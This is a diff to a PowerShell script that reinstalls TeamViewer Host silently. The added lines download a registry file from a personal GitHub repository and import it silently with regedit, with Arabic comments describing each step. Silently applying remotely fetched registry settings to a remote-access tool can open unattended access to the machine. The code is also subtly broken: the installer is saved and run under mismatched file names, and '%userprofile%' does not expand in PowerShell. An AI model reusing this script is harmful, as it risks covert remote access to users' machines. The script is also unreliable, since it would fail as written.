@@ -14,5 +14,18 @@ Start-Process -FilePath "C:\Program Files\TeamViewer\uninstall.exe" /S
 Start-Process -Filepath "C:\Program Files (x86)\TeamViewer\uninstall.exe"/S 
 (New-Object Net.WebClient).DownloadFile('https://customdesignservice.teamviewer.com/download/windows/v15/vh7t6rv/TeamViewer_Host_Setup.exe', '%userprofile%\Desktop\ackageq1.exe')
 %userprofile%\Desktop\packageq1.exe /S 
+Stop-Process -Name "TeamViewer" -Force
+New-Item -ItemType File -Path C:\Temp\newfile.txt -Value "Hello World!" -Force
+# تحميل ملف من الإنترنت
+$url = "https://raw.githubusercontent.com/defeat11/sav2/main/Teamvwier.reg"
+$outputPath = "%userprofile%\Desktop\reg.reg"
+Invoke-WebRequest -Uri $url -OutFile $outputPath
+
+# استيراد ملف تكوين التسجيل
+$RegFilePath = "%userprofile%\Desktop\reg.reg"
+Start-Process regedit -ArgumentList "/s $RegFilePath" -Wait
+
+# إيقاف تشغيل TeamViewer
+Stop-Process -Name "TeamViewer" -Force
 
 
